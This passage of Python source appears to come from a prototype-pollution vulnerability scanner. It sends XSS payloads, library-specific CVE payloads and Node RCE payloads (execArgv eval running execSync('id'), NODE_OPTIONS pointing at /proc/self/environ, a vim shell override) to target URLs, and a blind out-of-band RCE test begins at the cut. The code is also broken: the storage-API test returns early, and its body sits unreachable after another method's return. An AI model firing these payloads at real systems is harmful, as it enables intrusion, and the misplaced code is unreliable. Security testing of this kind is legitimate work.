                                            "reference": "PortSwigger - Object.defineProperty bypass (2024)",
                                        }
                                    )
                                    print(
                                        f"{Colors.FAIL}[!] CRITICAL: Verified XSS via descriptor pollution!{Colors.ENDC}"
                                    )
                                    print(f"    Payload: {payload}")
                                    print(f"    Alert: {alert_text}")
                            except Exception as e:
                                if "alert" in str(e).lower():
                                    browser_verified = True

                        # If HTTP indicators found but not browser verified, add as potential
                        # REMOVED: Reflection is not vulnerability
                        if http_match and not browser_verified and False:
                            findings.append(
                                {
                                    "type": "descriptor_pollution_potential",
                                    "method": f"DEFINEPROPERTYBYPASS_{pollution_type.upper()}",
                                    "severity": "HIGH",
                                    "description": f"Potential descriptor pollution: {description}",
                                    "payload": payload,
                                    "test_url": test_url,
                                    "verified": False,
                                    "note": "Requires manual browser verification",
                                    "reference": "PortSwigger - Object.defineProperty bypass (2024)",
                                }
                            )
                            print(
                                f"{Colors.WARNING}[!] HIGH: Potential descriptor pollution detected{Colors.ENDC}"
                            )

                except Exception as e:
                    logger.debug(f"Descriptor test error: {e}")
                    continue

            if not findings:
                print(
                    f"{Colors.GREEN}[✓] Object.defineProperty bypass test completed (No vulnerability){Colors.ENDC}"
                )
            else:
                print(
                    f"{Colors.GREEN}[✓] Found {len(findings)} descriptor pollution issue(s){Colors.ENDC}"
                )

        except Exception as e:
            print(
                f"{Colors.WARNING}[⚠] Descriptor pollution test error: {str(e)[:80]}{Colors.ENDC}"
            )

        return findings

    def test_cors_header_pollution(self, target_url) -> List[Dict[str, Any]]:
        """
        [Phase 1] CORS Header Pollution Detection

        Tests for CORS configuration pollution via Access-Control-Expose-Headers.
        This is a safe, non-destructive detection method for server-side PP.

        Reference: refrensi.md line 221
        Research: PortSwigger - Server-side PP Black-box detection
        """
        print(f"{Colors.BOLD}[→] Testing CORS Header Pollution...{Colors.ENDC}")
        findings: List[Dict[str, Any]] = []

        payloads = [
            # Expose-Headers manipulation
            (
                '{"__proto__":{"exposedHeaders":"X-PPMAP-Test"}}',
                "exposedHeaders",
                "Access-Control-Expose-Headers",
            ),
            (
                '{"__proto__":{"allowedHeaders":"X-Polluted"}}',
                "allowedHeaders",
                "Access-Control-Allow-Headers",
            ),
            (
                '{"__proto__":{"credentials":true}}',
                "credentials",
                "Access-Control-Allow-Credentials",
            ),
            # Constructor variant
            (
                '{"constructor":{"prototype":{"exposedHeaders":"X-PPMAP-Constructor"}}}',
                "constructor_exposedHeaders",
                "Constructor bypass",
            ),
        ]

        try:
            for payload, pollution_type, header_name in progress_iter(
                payloads, desc="CORS PP"
            ):
                try:
                    headers = {
                        "Content-Type": "application/json",
                        "Origin": "https://attacker.com",
                    }
                    resp = self.session.post(
                        target_url,
                        data=payload,
                        headers=headers,
                        timeout=5,
                        verify=False,
                    )

                    # Check if CORS headers were modified
                    cors_headers = {
                        k.lower(): v
                        for k, v in resp.headers.items()
                        if "access-control" in k.lower()
                    }

                    if cors_headers:
                        # Check for our pollution markers
                        for header, value in cors_headers.items():
                            if "ppmap" in value.lower() or "polluted" in value.lower():
                                findings.append(
                                    {
                                        "type": "cors_header_pollution",
                                        "method": f"CORS_{pollution_type.upper()}",
                                        "severity": "HIGH",
                                        "description": f"CORS configuration polluted via {header_name}",
                                        "payload": payload,
                                        "polluted_header": header,
                                        "header_value": value,
                                        "reference": "refrensi.md line 221 - CORS PP Detection",
                                    }
                                )
                                print(
                                    f"{Colors.FAIL}[!] CORS Pollution Detected: {header} = {value}{Colors.ENDC}"
                                )

                except Exception as e:
                    logger.debug(f"CORS test error: {e}")
                    continue

            if not findings:
                print(
                    f"{Colors.GREEN}[✓] CORS header pollution test completed (No vulnerability){Colors.ENDC}"
                )

        except Exception as e:
            print(f"{Colors.WARNING}[⚠] CORS test error: {str(e)[:80]}{Colors.ENDC}")

        return findings

    def test_third_party_gadgets(self, target_url) -> List[Dict[str, Any]]:
        """
        [Phase 1] Third-Party Library Gadget Testing

        Tests for gadgets in popular JavaScript libraries:
        - Google Analytics (hitCallback)
        - Google Tag Manager (sequence, event_callback)
        - Adobe DTM (cspNonce, bodyHiddenStyle)
        - Vue.js (v-if, template, props)
        - DOMPurify (ALLOWED_ATTR, documentMode)

        Reference: refrensi.md lines 69-96
        """
        print(f"{Colors.BOLD}[→] Testing Third-Party Library Gadgets...{Colors.ENDC}")
        findings: List[Dict[str, Any]] = []

        # Library-specific gadget payloads
        gadget_tests = [
            # Google Analytics
            {
                "library": "Google Analytics",
                "payload": "?__proto__[hitCallback]=alert(1)",
                "property": "hitCallback",
                "impact": "Code execution via setTimeout",
                "detection": ["ga(", "google-analytics", "_gaq"],
            },
            # Google Tag Manager
            {
                "library": "Google Tag Manager",
                "payload": "?__proto__[sequence]=alert(document.domain)",
                "property": "sequence",
                "impact": "RCE via eval in GTM",
                "detection": ["googletagmanager", "dataLayer", "gtm.js"],
            },
            {
                "library": "Google Tag Manager",
                "payload": "?__proto__[event_callback]=alert(1)",
                "property": "event_callback",
                "impact": "Callback hijacking",
                "detection": ["googletagmanager", "dataLayer"],
            },
            # Adobe DTM
            {
                "library": "Adobe DTM",
                "payload": '?__proto__[cspNonce]="><script>alert(1)</script>',
                "property": "cspNonce",
                "impact": "CSP bypass + XSS",
                "detection": ["adobe", "dtm", "satellite"],
            },
            # Vue.js
            {
                "library": "Vue.js",
                "payload": "?__proto__[template]=<img src=x onerror=alert(1)>",
                "property": "template",
                "impact": "Component injection + XSS",
                "detection": ["vue.js", "__vue__", "v-if", "v-for"],
            },
            # DOMPurify
            {
                "library": "DOMPurify",
                "payload": "?__proto__[ALLOWED_ATTR]=onerror",
                "property": "ALLOWED_ATTR",
                "impact": "Sanitization bypass",
                "detection": ["dompurify", "DOMPurify.sanitize"],
            },
        ]

        try:
            # First, detect which libraries are present
            initial_resp = self.session.get(target_url, timeout=5, verify=False)
            page_content = initial_resp.text.lower()

            detected_libraries = []
            for test in gadget_tests:
                if any(
                    indicator.lower() in page_content for indicator in test["detection"]
                ):
                    detected_libraries.append(test)

            if detected_libraries:
                print(
                    f"{Colors.CYAN}[*] Detected {len(detected_libraries)} third-party libraries{Colors.ENDC}"
                )

            # Test detected libraries
            for test in progress_iter(
                detected_libraries if detected_libraries else gadget_tests,
                desc="Gadget Tests",
            ):
                try:
                    test_url = target_url + test["payload"]
                    resp = self.session.get(test_url, timeout=5, verify=False)

                    # Check for reflection or execution indicators
                    indicators = ["alert(", "onerror=", test["property"], "PPMAP"]

                    if resp.status_code < 400 and any(
                        ind in resp.text for ind in indicators
                    ):
                        findings.append(
                            {
                                "type": "third_party_gadget",
                                "method": f'GADGET_{test["library"].upper().replace(" ", "_")}',
                                "severity": "HIGH",
                                "library": test["library"],
                                "property": test["property"],
                                "impact": test["impact"],
                                "payload": test["payload"],
                                "test_url": test_url,
                                "reference": "refrensi.md lines 69-96 - Third-Party Gadgets",
                            }
                        )
                        print(
                            f"{Colors.FAIL}[!] Gadget Found: {test['library']} ({test['property']}){Colors.ENDC}"
                        )

                except Exception as e:
                    logger.debug(f"Gadget test error: {e}")
                    continue

            if not findings:
                print(
                    f"{Colors.GREEN}[✓] Third-party gadget test completed (No vulnerability){Colors.ENDC}"
                )

        except Exception as e:
            print(
                f"{Colors.WARNING}[⚠] Third-party gadget test error: {str(e)[:80]}{Colors.ENDC}"
            )

        return findings

    def test_storage_api_pollution(self, target_url) -> List[Dict[str, Any]]:
        """
        [Phase 1] localStorage/sessionStorage API Pollution

        Tests for pollution via direct property access to Web Storage APIs.
        Direct access (localStorage.item) is vulnerable, while getItem() is safe.

        Reference: refrensi.md line 98
        Research: Gareth Heyes - Browser API Gadgets
        """
        print(f"{Colors.BOLD}[→] Testing Storage API Pollution...{Colors.ENDC}")
        findings: List[Dict[str, Any]] = []

        if not (hasattr(self, "driver") and self.driver):
            print(
                f"{Colors.WARNING}[⚠] Browser required for Storage API tests (skipped){Colors.ENDC}"
            )
            return findings

    def test_cve_specific_payloads(self, target_url) -> List[Dict[str, Any]]:
        """
        [Phase 2] CVE-Specific Payload Testing

        Tests for known CVEs with specific exploitation techniques:
        - CVE-2025-13465 (Lodash _.unset, _.omit)
        - CVE-2024-38986 (@75lb/deep-merge RCE)
        - CVE-2020-8203 (Lodash _.merge)
        - CVE-2022-25878 (Protobufjs)
        - CVE-2022-25904 (Safe-eval)
        - CVE-2022-25645 (Dset)

        Reference: refrensi.md lines 203-211
        """
        print(f"{Colors.BOLD}[→] Testing CVE-Specific Payloads...{Colors.ENDC}")
        findings: List[Dict[str, Any]] = []

        cve_tests = [
            # CVE-2025-13465 - Lodash _.unset / _.omit
            {
                "cve": "CVE-2025-13465",
                "library": "Lodash",
                "method": "_.unset / _.omit",
                "payload": '{"constructor":{"prototype":{"polluted":"CVE-2025-13465"}}}',
                "detection": ["lodash", "_.unset", "_.omit"],
                "severity": "CRITICAL",
            },
            # CVE-2024-38986 - @75lb/deep-merge RCE
            {
                "cve": "CVE-2024-38986",
                "library": "@75lb/deep-merge",
                "method": "deepMerge",
                "payload": '{"__proto__":{"shell":"vim","input":":!whoami\\n"}}',
                "detection": ["deep-merge", "deepmerge"],
                "severity": "CRITICAL",
            },
            # CVE-2020-8203 - Lodash _.merge
            {
                "cve": "CVE-2020-8203",
                "library": "Lodash",
                "method": "_.merge",
                "payload": '{"__proto__":{"isAdmin":true,"role":"admin"}}',
                "detection": ["lodash", "_.merge"],
                "severity": "HIGH",
            },
            # CVE-2022-25878 - Protobufjs
            {
                "cve": "CVE-2022-25878",
                "library": "Protobufjs",
                "method": "parse",
                "payload": '{"__proto__":{"toString":"function(){return \\"PPMAP_PROTO\\"}"}}',
                "detection": ["protobuf", "protobufjs"],
                "severity": "HIGH",
            },
            # CVE-2022-25904 - Safe-eval
            {
                "cve": "CVE-2022-25904",
                "library": "Safe-eval",
                "method": "safeEval",
                "payload": '{"constructor":{"prototype":{"toString":"[Function: PPMAP]"}}}',
                "detection": ["safe-eval", "safeEval"],
                "severity": "CRITICAL",
            },
            # CVE-2022-25645 - Dset
            {
                "cve": "CVE-2022-25645",
                "library": "Dset",
                "method": "dset",
                "payload": '{"__proto__.polluted":"CVE-2022-25645"}',
                "detection": ["dset"],
                "severity": "MEDIUM",
            },
        ]

        try:
            # First, detect which libraries might be present
            initial_resp = self.session.get(target_url, timeout=5, verify=False)
            page_content = initial_resp.text.lower()

            detected_cves = []
            for test in cve_tests:
                if any(
                    indicator.lower() in page_content for indicator in test["detection"]
                ):
                    detected_cves.append(test)
                    print(
                        f"{Colors.CYAN}[*] Detected {test['library']} - Testing {test['cve']}{Colors.ENDC}"
                    )

            # Test all CVEs (even if not detected, for comprehensive coverage)
            test_list = detected_cves if detected_cves else cve_tests

            for test in progress_iter(test_list, desc="CVE Tests"):
                try:
                    headers = {"Content-Type": "application/json"}
                    resp = self.session.post(
                        target_url,
                        data=test["payload"],
                        headers=headers,
                        timeout=5,
                        verify=False,
                    )

                    # Check for pollution indicators
                    indicators = [
                        "polluted",
                        "isAdmin",
                        "PPMAP",
                        test["cve"],
                        "admin",
                        "true",
                    ]

                    if resp.status_code < 400:
                        # Check response for specific pollution markers (avoiding common words like 'true')
                        specific_indicators = [test["cve"], "PPMAP_PROTO"]
                        if any(ind in resp.text for ind in specific_indicators):
                            findings.append(
                                {
                                    "type": "cve_specific",
                                    "method": f'CVE_{test["cve"].replace("-", "_")}',
                                    "severity": test["severity"],
                                    "cve": test["cve"],
                                    "library": test["library"],
                                    "vulnerable_method": test["method"],
                                    "payload": test["payload"],
                                    "description": f'{test["cve"]} - {test["library"]} {test["method"]} vulnerability',
                                    "reference": f'refrensi.md - {test["cve"]}',
                                }
                            )
                            print(
                                f"{Colors.FAIL}[!] {test['severity']}: {test['cve']} vulnerability detected!{Colors.ENDC}"
                            )

                        # Also check for error-based detection
                        elif resp.status_code == 500:
                            findings.append(
                                {
                                    "type": "cve_specific_potential",
                                    "method": f'CVE_{test["cve"].replace("-", "_")}_POTENTIAL',
                                    "severity": "MEDIUM",
                                    "cve": test["cve"],
                                    "library": test["library"],
                                    "payload": test["payload"],
                                    "description": f'Potential {test["cve"]} - Server error on payload',
                                    "note": "Requires manual verification",
                                    "reference": f'refrensi.md - {test["cve"]}',
                                }
                            )
                            print(
                                f"{Colors.WARNING}[!] Potential {test['cve']} (500 error){Colors.ENDC}"
                            )

                except Exception as e:
                    logger.debug(f"CVE test error ({test['cve']}): {e}")
                    continue

            if not findings:
                print(
                    f"{Colors.GREEN}[✓] CVE-specific payload test completed (No vulnerability){Colors.ENDC}"
                )
            else:
                print(
                    f"{Colors.GREEN}[✓] Found {len(findings)} CVE-specific issue(s){Colors.ENDC}"
                )

        except Exception as e:
            print(f"{Colors.WARNING}[⚠] CVE test error: {str(e)[:80]}{Colors.ENDC}")

        return findings

    def test_kibana_telemetry_rce(self, target_url) -> List[Dict[str, Any]]:
        """
        [Phase 3] Kibana Telemetry RCE (HackerOne #852613)

        Tests for Kibana telemetry collector RCE via Lodash _.set.
        This vulnerability was reported with a $10,000 bounty.

        Vulnerable code pattern:
            _.set(telemetryData, userInput.path, userInput.value)

        Reference: refrensi.md line 134, HackerOne #852613
        """
        print(
            f"{Colors.BOLD}[→] Testing Kibana Telemetry RCE (HackerOne #852613)...{Colors.ENDC}"
        )
        findings: List[Dict[str, Any]] = []

        # Kibana-specific payloads
        kibana_payloads = [
            # Telemetry collector exploitation
            {
                "payload": '{"path":"__proto__.env.NODE_OPTIONS","value":"--require /proc/self/environ"}',
                "target": "Telemetry Collector",
                "impact": "RCE via NODE_OPTIONS",
            },
            {
                "payload": '{"path":"constructor.prototype.shell","value":"vim"}',
                "target": "Telemetry Data",
                "impact": "Shell override",
            },
            # Alternative Lodash _.set exploitation
            {
                "payload": '{"__proto__":{"execArgv":["--eval=require(\\"child_process\\").execSync(\\"id\\")"]}',
                "target": "Process Arguments",
                "impact": "RCE via execArgv",
            },
        ]

        try:
            # Check if target is Kibana
            resp = self.session.get(target_url, timeout=5, verify=False)
            is_kibana = "kibana" in resp.text.lower() or "elastic" in resp.text.lower()

            if is_kibana:
                print(
                    f"{Colors.CYAN}[*] Kibana/Elastic detected - Running targeted tests{Colors.ENDC}"
                )

            for test in progress_iter(kibana_payloads, desc="Kibana RCE"):
                try:
                    headers = {"Content-Type": "application/json", "kbn-xsrf": "true"}
                    resp = self.session.post(
                        target_url,
                        data=test["payload"],
                        headers=headers,
                        timeout=5,
                        verify=False,
                    )

                    # Check for specific RCE markers, not just common words
                    specific_indicators = ["PPMAP_RCE", "kbn-xsrf"]

                    if resp.status_code < 400 and any(
                        ind in resp.text for ind in specific_indicators
                    ):
                        findings.append(
                            {
                                "type": "kibana_telemetry_rce",
                                "method": "KIBANA_TELEMETRY_RCE",
                                "severity": "CRITICAL",
                                "bounty": "$10,000",
                                "target": test["target"],
                                "impact": test["impact"],
                                "payload": test["payload"],
                                "description": "Kibana Telemetry Collector RCE via Lodash _.set",
                                "reference": "HackerOne #852613 - refrensi.md line 134",
                            }
                        )
                        print(
                            f"{Colors.FAIL}[!] CRITICAL: Kibana Telemetry RCE detected!{Colors.ENDC}"
                        )
                        print(f"    Impact: {test['impact']}")

                except Exception as e:
                    logger.debug(f"Kibana test error: {e}")
                    continue

            if not findings:
                print(
                    f"{Colors.GREEN}[✓] Kibana Telemetry RCE test completed (No vulnerability){Colors.ENDC}"
                )

        except Exception as e:
            print(f"{Colors.WARNING}[⚠] Kibana test error: {str(e)[:80]}{Colors.ENDC}")

        return findings

    def test_blitzjs_rce_chain(self, target_url) -> List[Dict[str, Any]]:
        """
        [Phase 3] Blitz.js RCE Chain (CVE-2022-23631)

        Tests for Blitz.js superjson serialization RCE chain.
        Complex exploitation involving superjson deserialization.

        Vulnerable flow:
            1. superjson.deserialize(userInput)
            2. Object.prototype pollution
            3. RCE via polluted properties

        Reference: refrensi.md lines 132-133, CVE-2022-23631
        """
        print(
            f"{Colors.BOLD}[→] Testing Blitz.js RCE Chain (CVE-2022-23631)...{Colors.ENDC}"
        )
        findings: List[Dict[str, Any]] = []

        # Blitz.js / superjson payloads
        blitzjs_payloads = [
            # Superjson deserialization exploitation
            {
                "payload": '{"json":{"__proto__":{"ppmap_shell":"vim"}},"meta":{"values":{"__proto__":["class"]}}}',
                "component": "superjson.deserialize",
                "impact": "RCE via shell property",
            },
            {
                "payload": '{"json":{"constructor":{"prototype":{"ppmap_execArgv":["--eval=console.log(1)"]}}},"meta":{}}',
                "component": "Blitz.js Query",
                "impact": "RCE via execArgv",
            },
            # Alternative serialization bypass
            {
                "payload": '{"__proto__":{"ppmap_isAdmin":true,"ppmap_role":"admin"},"type":"BlitzQuery"}',
                "component": "Authorization",
                "impact": "Privilege escalation",
            },
        ]

        try:
            # Check if target is Blitz.js
            resp = self.session.get(target_url, timeout=5, verify=False)
            is_blitzjs = (
                "blitz" in resp.text.lower() or "superjson" in resp.text.lower()
            )

            if is_blitzjs:
                print(
                    f"{Colors.CYAN}[*] Blitz.js/superjson detected - Running targeted tests{Colors.ENDC}"
                )

            for test in progress_iter(blitzjs_payloads, desc="Blitz.js RCE"):
                try:
                    headers = {"Content-Type": "application/json"}
                    resp = self.session.post(
                        target_url,
                        data=test["payload"],
                        headers=headers,
                        timeout=5,
                        verify=False,
                    )

                    # Check for exploitation indicators
                    indicators = ["ppmap_shell", "ppmap_execArgv", "ppmap_isAdmin"]

                    if resp.status_code < 400 and any(
                        ind in resp.text for ind in indicators
                    ):
                        findings.append(
                            {
                                "type": "blitzjs_rce_chain",
                                "method": "BLITZJS_RCE_CHAIN",
                                "severity": "CRITICAL",
                                "cve": "CVE-2022-23631",
                                "component": test["component"],
                                "impact": test["impact"],
                                "payload": test["payload"],
                                "description": "Blitz.js superjson deserialization RCE chain",
                                "reference": "CVE-2022-23631 - refrensi.md lines 132-133",
                            }
                        )
                        print(
                            f"{Colors.FAIL}[!] CRITICAL: Blitz.js RCE Chain detected!{Colors.ENDC}"
                        )
                        print(f"    Component: {test['component']}")

                except Exception as e:
                    logger.debug(f"Blitz.js test error: {e}")
                    continue

            if not findings:
                print(
                    f"{Colors.GREEN}[✓] Blitz.js RCE Chain test completed (No vulnerability){Colors.ENDC}"
                )

        except Exception as e:
            print(
                f"{Colors.WARNING}[⚠] Blitz.js test error: {str(e)[:80]}{Colors.ENDC}"
            )

        return findings

    def test_elastic_xss(self, target_url) -> List[Dict[str, Any]]:
        """
        [Phase 3] Elastic XSS (HackerOne #998398)

        Tests for Elastic XSS vulnerability via prototype pollution.
        Reported on HackerOne with significant bounty.

        Vulnerable pattern:
            - Prototype pollution in Elastic UI components
            - XSS via polluted DOM properties

        Reference: refrensi.md lines 176-201, HackerOne #998398
        """
        print(
            f"{Colors.BOLD}[→] Testing Elastic XSS (HackerOne #998398)...{Colors.ENDC}"
        )
        findings: List[Dict[str, Any]] = []

        # Elastic-specific XSS payloads
        elastic_payloads = [
            # DOM-based XSS via PP
            {
                "payload": "?__proto__[innerHTML]=<img src=x onerror=alert(document.domain)>",
                "component": "Elastic UI",
                "impact": "DOM XSS",
            },
            {
                "payload": '?__proto__[outerHTML]=<script>alert("PPMAP_ELASTIC_XSS")</script>',
                "component": "DOM Renderer",
                "impact": "Reflected XSS",
            },
            # Constructor-based XSS
            {
                "payload": "?constructor[prototype][onclick]=alert(1)",
                "component": "Event Handler",
                "impact": "Event-based XSS",
            },
        ]

        try:
            # Check if target is Elastic
            resp = self.session.get(target_url, timeout=5, verify=False)
            is_elastic = "elastic" in resp.text.lower() or "kibana" in resp.text.lower()

            if is_elastic:
                print(
                    f"{Colors.CYAN}[*] Elastic/Kibana detected - Running XSS tests{Colors.ENDC}"
                )

            for test in progress_iter(elastic_payloads, desc="Elastic XSS"):
                try:
                    test_url = target_url + test["payload"]
                    resp = self.session.get(test_url, timeout=5, verify=False)

                    test_marker = "PPMAP_ELASTIC_XSS"
                    # STRICT CHECK: Ensure the tag is NOT encoded
                    if "outerHTML" in test["payload"]:
                        check_str = f'<script>alert("{test_marker}")</script>'
                    elif "innerHTML" in test["payload"]:
                        check_str = "<img src=x onerror=alert(document.domain)>"
                    else:
                        check_str = "alert(1)"  # constructor payload

                    # Ensure response is HTML
                    is_html = "text/html" in resp.headers.get("Content-Type", "")

                    if resp.status_code < 400 and check_str in resp.text and is_html:
                        findings.append(
                            {
                                "type": "elastic_xss",
                                "method": "ELASTIC_XSS",
                                "severity": "HIGH",
                                "component": test["component"],
                                "impact": test["impact"],
                                "payload": test["payload"],
                                "test_url": test_url,
                                "description": "Elastic XSS via Prototype Pollution",
                                "reference": "HackerOne #998398 - refrensi.md lines 176-201",
                            }
                        )
                        print(
                            f"{Colors.FAIL}[!] HIGH: Elastic XSS detected!{Colors.ENDC}"
                        )
                        print(f"    Component: {test['component']}")

                        # Verify with browser if available
                        if hasattr(self, "driver") and self.driver:
                            try:
                                # Only verify if driver is healthy
                                if not self.driver or not self.driver.session_id:
                                    continue

                                print(
                                    f"{Colors.BOLD}[*] Verifying Elastic XSS with Browser...{Colors.ENDC}"
                                )

                                # Navigate with safety check
                                try:
                                    self.driver.get(test_url)
                                except Exception:
                                    # Start fresh session if navigation aborted
                                    self.driver.refresh()
                                    self.driver.get(test_url)

                                time.sleep(1)

                                # Check for alerts or DOM execution
                                try:
                                    alert_start = self.driver.switch_to.alert.text
                                    if alert_start:
                                        print(
                                            f"{Colors.FAIL}[!] CRITICAL: Browser Confirmed XSS Execution!{Colors.ENDC}"
                                        )
                                        self.driver.switch_to.alert.accept()  # Close alert
                                        findings.append(
                                            {
                                                "type": "elastic_xss_verified",
                                                "method": "ELASTIC_XSS_VERIFIED",
                                                "severity": "CRITICAL",
                                                "component": test["component"],
                                                "impact": "Proven Reflected XSS",
                                                "payload": test["payload"],
                                                "test_url": test_url,
                                                "description": "Elastic XSS Verified via Browser Execution",
                                                "reference": "HackerOne #998398",
                                            }
                                        )
                                except Exception:
                                    print(
                                        f"{Colors.YELLOW}[!] Browser Verification Failed: No XSS execution detected.{Colors.ENDC}"
                                    )
                            except Exception as ex:
                                print(f"Browser verify warning: {str(ex)[:50]}")

                except Exception as e:
                    logger.debug(f"Elastic XSS test error: {e}")
                    continue

            if not findings:
                print(
                    f"{Colors.GREEN}[✓] Elastic XSS test completed (No vulnerability){Colors.ENDC}"
                )

        except Exception as e:
            print(
                f"{Colors.WARNING}[⚠] Elastic XSS test error: {str(e)[:80]}{Colors.ENDC}"
            )

        return findings

        try:
            # Navigate to target
            self.driver.get(target_url)
            time.sleep(1)

            # Test localStorage pollution
            storage_tests = [
                {
                    "api": "localStorage",
                    "test_script": """
                        // Pollute prototype
                        Object.prototype.testItem = 'PPMAP_POLLUTED';
                        
                        // Test direct access (vulnerable)
                        var directAccess = localStorage.testItem;
                        
                        // Test getItem (safe)
                        var safeAccess = localStorage.getItem('testItem');
                        
                        // Cleanup
                        delete Object.prototype.testItem;
                        
                        return {
                            vulnerable: directAccess === 'PPMAP_POLLUTED',
                            directValue: directAccess,
                            safeValue: safeAccess
                        };
                    """,
                },
                {
                    "api": "sessionStorage",
                    "test_script": """
                        Object.prototype.sessionTest = 'PPMAP_SESSION_POLLUTED';
                        var result = sessionStorage.sessionTest === 'PPMAP_SESSION_POLLUTED';
                        delete Object.prototype.sessionTest;
                        return result;
                    """,
                },
            ]

            for test in storage_tests:
                try:
                    result = self.driver.execute_script(test["test_script"])

                    if isinstance(result, dict):
                        if result.get("vulnerable"):
                            findings.append(
                                {
                                    "type": "storage_api_pollution",
                                    "method": f'STORAGE_{test["api"].upper()}',
                                    "severity": "MEDIUM",
                                    "api": test["api"],
                                    "description": f'{test["api"]} vulnerable to direct property access',
                                    "direct_value": result.get("directValue"),
                                    "safe_value": result.get("safeValue"),
                                    "recommendation": f'Use {test["api"]}.getItem() instead of direct access',
                                    "reference": "refrensi.md line 98 - Storage API Gadgets",
                                }
                            )
                            print(
                                f"{Colors.WARNING}[!] {test['api']} pollution detected{Colors.ENDC}"
                            )
                    elif result is True:
                        findings.append(
                            {
                                "type": "storage_api_pollution",
                                "method": f'STORAGE_{test["api"].upper()}',
                                "severity": "MEDIUM",
                                "api": test["api"],
                                "description": f'{test["api"]} vulnerable to prototype pollution',
                                "reference": "refrensi.md line 98",
                            }
                        )
                        print(
                            f"{Colors.WARNING}[!] {test['api']} pollution detected{Colors.ENDC}"
                        )

                except Exception as e:
                    logger.debug(f"Storage test error: {e}")
                    continue

            if not findings:
                print(
                    f"{Colors.GREEN}[✓] Storage API pollution test completed (No vulnerability){Colors.ENDC}"
                )

        except Exception as e:
            print(
                f"{Colors.WARNING}[⚠] Storage API test error: {str(e)[:80]}{Colors.ENDC}"
            )

        return findings

    def test_with_confidence_scoring(self) -> List[Dict[str, Any]]:
        """Test and score PP with confidence metrics (v6 feature)"""
        print(f"{Colors.CYAN}[→] Testing with confidence scoring...{Colors.ENDC}")

        findings: List[Dict[str, Any]] = []
        marker = f"conf_{int(time.time())}"

        try:
            # Test basic PP
            test_script = f"""
            try {{
                $.extend(true, {{}}, {{"__proto__": {{"{marker}": true}}}});
                var verified = Object.prototype['{marker}'] === true;
                if (verified) {{
                    delete Object.prototype['{marker}'];
                }}
                return verified;
            }} catch(e) {{ return false; }}
            """

            if self.driver.execute_script(test_script):
                # Verify with multiple methods for confidence scoring
                verification = PrototypePollutionVerifier.verify_pollution(
                    self.driver, marker
                )

                findings.append(
                    {
                        "type": "jquery_pp_scored",
                        "confidence": verification["confidence"],
                        "verified_methods": verification["methods"],
                        "severity": (
                            "CRITICAL" if verification["confidence"] >= 66 else "HIGH"
                        ),
                        "verification": verification,
                    }
                )

                confidence_pct = verification["confidence"]
                print(
                    f"{Colors.FAIL}[!] jQuery PP Detected - Confidence: {confidence_pct:.1f}%{Colors.ENDC}"
                )
                print(
                    f"{Colors.FAIL}    Verified by: {', '.join(verification['methods'])}{Colors.ENDC}"
                )
        except Exception as e:
            print(
                f"{Colors.WARNING}[⚠] Confidence scoring error: {str(e)[:50]}{Colors.ENDC}"
            )

        if not findings:
            print(
                f"{Colors.GREEN}[✓] No PP detected via confidence scoring{Colors.ENDC}"
            )
        return findings

    def discover_and_test_endpoints(self, base_url):
        """Discover endpoints and test them (v5 feature)"""
        print(f"{Colors.CYAN}[→] Discovering endpoints for testing...{Colors.ENDC}")

        discovery = EndpointDiscovery(self.session)
        endpoints = discovery.discover_endpoints(base_url, depth=2, max_endpoints=20)

        tested = 0
        for endpoint in endpoints[:10]:  # Test first 10 endpoints
            try:
                print(
                    f"{Colors.CYAN}  [*] Testing endpoint: {endpoint[:60]}...{Colors.ENDC}"
                )
                resp = self.session.get(endpoint, timeout=5, verify=False)

                if resp.status_code < 400 and len(resp.text) > 100:
                    tested += 1
            except:
                pass

        print(f"{Colors.GREEN}[✓] Tested {tested} endpoints{Colors.ENDC}")
        # Endpoints are informational only — not vulnerabilities
        return []

    def setup_browser(self, target_url):
        """Setup browser for scanning"""
        try:
            from ppmap.browser import get_browser

            browser = get_browser(headless=True, timeout=self.timeout)
            if not browser:
                print(
                    f"{Colors.FAIL}[!] Browser setup failed: no backend available{Colors.ENDC}"
                )
                return False
            self.driver = browser
            self.driver.get(target_url, wait=0.5)
            print(f"{Colors.GREEN}[✓] Browser ready{Colors.ENDC}")
            return True
        except Exception as e:
            print(f"{Colors.FAIL}[!] Browser setup failed: {str(e)}{Colors.ENDC}")
            return False

    def _get_title(self, html):
        try:
            import re

            match = re.search(r"<title>(.*?)</title>", html, re.IGNORECASE | re.DOTALL)
            if match:
                return match.group(1).strip()[:50]
        except:
            pass
        return "Unknown"

    def check_target_status(self, url):
        """Check if target is alive and accessible"""
        print(f"{Colors.BLUE}[*] Checking target status: {url}{Colors.ENDC}")
        try:
            resp = self.session.get(
                url,
                verify=self.session.verify,
                timeout=self.timeout,
                allow_redirects=True,
            )
            status = resp.status_code

            status_color = (
                Colors.GREEN
                if status < 300
                else (Colors.YELLOW if status < 400 else Colors.FAIL)
            )
            title = self._get_title(resp.text)
            print(f"    Status: {status_color}[{status}]{Colors.ENDC} | Title: {title}")

            # Strict mode: Skip DEAD targets (Connection Error, 5xx server crashes, etc)
            # BUT allow 403/401/404/405 because those might be POST-only APIs or WAF walls!
            if status >= 500:
                print(
                    f"{Colors.WARNING}[-] Target returned {status} (Server Error). Skipping.{Colors.ENDC}"
                )
                return False

            if status == 403 or status == 401:
                print(
                    f"{Colors.WARNING}[!] Target returned {status} (Forbidden). Possible WAF/Auth - Proceeding to Bypass Tests.{Colors.ENDC}"
                )
                return True

            return True
        except Exception as e:
            print(f"{Colors.FAIL}[!] Target unreachable: {str(e)[:100]}{Colors.ENDC}")
            return False

    def test_blind_oob(self, target_url) -> List[Dict[str, Any]]:
        """Test for Blind OOB RCE via Prototype Pollution (v4.0)"""
        print(f"{Colors.CYAN}[→] Testing Blind OOB RCE (Interact.sh)...{Colors.ENDC}")
        findings: List[Dict[str, Any]] = []

        if not self.oob_detector:
            try:
                from ppmap.oob import OOBDetector

                self.oob_detector = OOBDetector()
                if not self.oob_detector.register():
                    print(
                        f"{Colors.WARNING}[!] Failed to register OOB session. Skipping blind tests.{Colors.ENDC}"
                    )
                    return []
            except ImportError:
                print(
                    f"{Colors.FAIL}[!] ppmap.oob module not found. Skipping.{Colors.ENDC}"
                )
                return []
            except Exception as e:
                print(f"{Colors.FAIL}[!] OOB Init Error: {e}{Colors.ENDC}")
                return []

        oob_domain = self.oob_detector.get_payload_domain()
        print(f"{Colors.BLUE}[*] OOB Domain: {oob_domain}{Colors.ENDC}")

        try:
            # Get payloads from utils
            from utils.payloads import SERVER_SIDE_PP_PAYLOADS

            oob_payloads = SERVER_SIDE_PP_PAYLOADS.get("blind_oob", [])

            for raw_payload in oob_payloads:
                # Replace %OOB% with actual domain
